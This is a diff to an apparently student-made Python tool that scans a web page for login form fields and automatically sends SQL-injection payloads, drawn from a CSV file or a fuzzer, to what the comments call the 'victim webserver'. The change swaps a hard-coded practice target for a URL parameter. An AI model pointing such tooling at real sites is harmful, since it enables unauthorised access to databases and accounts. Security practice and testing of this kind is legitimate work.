@@ -3,12 +3,13 @@ import requests
 import re
 from Display import *
 from pull_from_CSV import *
+from fuzzer import *
 
 #searches html page for any potential forms 
 #generates and executes POST requests to the victim webserver
-def POST_generator():
+def POST_generator(url, fuzz_flag):
 
-    URL = "https://sqlzoo.net/hack/passwd.pl"
+    URL = url
     r = requests.get(URL)
     html_bytes = r.text
 
@@ -39,7 +40,11 @@ def POST_generator():
     #here we're going to loop and keep sending injection attempts to the POST_send function
     for n in range(len(form_inputs)):
         if (n + 1 < len(form_inputs)):
-            payload = pull_from_CSV()
+            if(fuzz_flag):
+                #payload = pull_from_generator()
+                payload = fuzz()
+            else:
+                payload = pull_from_CSV()
             for x,y in payload.items():
                 print("Trying: " + y + "on database: " + x + " where the URL is: " + URL + " and the forms are: " + form_inputs[n] + " " + form_inputs[n+1])
                 POST_send(URL, form_inputs[n], form_inputs[n+1], y, y)
@@ -57,6 +62,3 @@ def POST_send(URL, username_field, password_field, username_input, password_inpu
     file.write("Hello this is the payload: " + username_input + "\n\n" + r.text + "\n\n")
     print(r.status_code)
 
-if __name__ == "__main__" :
-
-    POST_generator()
